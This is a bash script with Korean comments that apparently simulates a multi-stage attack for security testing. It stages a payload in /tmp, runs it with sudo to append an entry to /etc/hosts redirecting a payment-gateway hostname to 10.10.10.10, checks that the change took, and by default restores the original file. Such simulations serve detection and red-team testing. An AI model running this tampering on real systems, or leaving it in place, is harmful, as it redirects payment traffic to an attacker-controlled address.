#!/bin/bash

# 시나리오 1-3: 다단계 공격을 통한 설정 파일 변조 [SAFE VERSION]

LOG_PREFIX="[ATTACKER]"

log_attack() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') $LOG_PREFIX $1"
}

PAYLOAD_PATH="/tmp/payload_$(date +%s).sh"
TARGET_FILE="/etc/hosts"
BACKUP_FILE="/tmp/hosts.bak.$(date +%s)"
MALICIOUS_ENTRY="10.10.10.10 payment-gateway.internal.com # Malicious Entry"

# --- 함수 정의 ---
install() {
    log_attack "Scenario 1-3: Multi-stage Attack START"
    echo "------------------------------------------------------------------"

    if [ "$EUID" -eq 0 ]; then
      log_attack "ERROR: This part should be run as a NON-ROOT user."
      exit 1
    fi

    log_attack "Phase 1: Staging - 'Downloading' payload to /tmp..."
    cat > $PAYLOAD_PATH <<- EOF
#!/bin/bash
echo "[PAYLOAD] Modifying $TARGET_FILE..."
echo "$MALICIOUS_ENTRY" >> $TARGET_FILE
EOF
    sleep 2

    log_attack "Phase 2: Making the payload executable..."
    chmod +x $PAYLOAD_PATH
    sleep 2

    log_attack "Phase 3: Executing payload with sudo to tamper config..."
    sudo cp $TARGET_FILE $BACKUP_FILE
    sudo $PAYLOAD_PATH
    sleep 2

    log_attack "Verifying tampering..."
    if grep -q "payment-gateway" $TARGET_FILE; then
        log_attack "SUCCESS: Malicious entry found in $TARGET_FILE."
    fi
}

cleanup() {
    log_attack "Cleanup: Restoring system..."
    if [ -f "$BACKUP_FILE" ]; then
        sudo mv $BACKUP_FILE $TARGET_FILE
        log_attack "Original '$TARGET_FILE' restored."
    fi
    rm -f $PAYLOAD_PATH
    log_attack "Payload script removed."
}

# --- 메인 실행 로직 ---
case "$1" in
    "")
        install
        cleanup
        ;;
    "no-cleanup")
        install
        ;;
    "cleanup")
        cleanup
        ;;
    *)
        echo "Usage: $0 [no-cleanup|cleanup]"
        exit 1
        ;;
esac

log_attack "Scenario 1-3: Simulation FINISHED."